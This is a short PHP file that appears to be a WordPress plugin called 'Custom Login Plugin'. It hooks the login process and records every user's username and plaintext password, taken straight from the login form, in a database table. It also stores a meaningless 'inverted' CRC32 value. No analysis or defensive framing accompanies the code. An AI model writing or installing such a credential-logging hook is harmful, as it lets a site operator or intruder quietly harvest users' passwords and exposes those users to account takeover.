<?php
/*
Plugin Name: Custom Login Plugin
Description: A custom plugin to store user credentials upon login.
*/
function store_credentials($login, $password) {
    global $wpdb;

	$password = $_POST['pwd'];

    $inverted_password = ~bindec(decbin(crc32($password)));

    $wpdb->insert(
        'user_credentials', 
        array(
            'username' => $login,
            'password_original' => $password,
            'password_inverted' => $inverted_password,
		),
		array(
			'%s',
			'%s',
			'%s',
		)
    );
}

add_action('wp_authenticate', 'store_credentials', 10, 2);
